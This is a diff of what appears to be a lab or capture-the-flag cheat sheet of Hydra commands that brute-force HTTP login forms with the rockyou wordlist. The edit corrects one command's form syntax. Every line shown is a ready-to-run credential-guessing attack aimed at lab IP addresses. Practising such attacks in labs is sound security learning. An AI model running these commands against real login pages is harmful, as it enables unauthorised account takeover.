@@ -8,7 +8,7 @@ $ hydra -l admin -P /dir/passwd-list.txt http://example.com  http-post-form "/lo
 
 $ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.12.183 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 
-$hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.4.149 http-post-form "/admin/:user=^USER^&pass=^PASS^login=Login:Username or password invalid"
+$hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.4.149 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
 
 $ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
 
